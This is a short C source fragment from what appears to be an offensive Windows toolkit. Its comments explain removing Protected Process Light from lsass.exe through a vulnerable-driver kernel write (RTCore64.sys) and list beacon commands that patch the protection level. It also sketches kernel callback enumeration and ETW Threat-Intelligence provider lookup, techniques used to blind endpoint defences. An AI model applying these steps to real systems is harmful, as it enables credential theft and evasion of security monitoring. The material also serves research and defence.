/*
 * PS_PROTECTION — Process Protection Level Structure
 *
 * Protected Process Light (PPL) enforces a signer hierarchy in which
 * handles to a protected process can only be obtained by processes of
 * equal or higher signer rank. Windows 11+ enables PPL on lsass.exe
 * by default.
 *
 * The protection level is stored in the Protection field of the target's
 * EPROCESS structure and can be modified using a kernel write primitive
 * (e.g., via a vulnerable driver like RTCore64.sys).
 *
 * Example BOF commands:
 *   beacon> ppenum 1008      -- enumerate protection level
 *   beacon> pppatch 1008 0   -- set to PsProtectedTypeNone
 *   beacon> pppatch 1008 2   -- restore PsProtectedSignerLsa
 */

#include <windows.h>

struct _PS_PROTECTION {
    union {
        UCHAR Level;
        struct {
            UCHAR Type   : 3;
            UCHAR Audit  : 1;
            UCHAR Signer : 4;
        };
    };
};

/*
 * Kernel callback enumeration helper:
 *   Mask the low 4 bits of each entry, dereference to the
 *   EX_CALLBACK_ROUTINE_BLOCK, extract the function pointer at offset +0x8.
 */
void enumerate_callback_entry(DWORD64 table_base, int index) {
    DWORD64 raw   = read_kernel_qword(table_base + index * 8);
    DWORD64 block = raw & 0xFFFFFFFFFFFFFFF0;             /* strip tag */
    DWORD64 fn    = read_kernel_qword(block + 0x8);       /* Function ptr */
    /* resolve module owning fn via lm a <fn> */
}

/*
 * ETW-TI provider hash bucket calculation:
 *   (Data1 ^ Data2 ^ Data4[0] ^ Data4[4]) & 0x3F
 *
 *   For ETW-TI GUID {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}:
 *   (0xF4E1897C ^ 0xBB5D ^ 0xF1 ^ 0x4D) & 0x3F = 0x1D (bucket 29)
 */
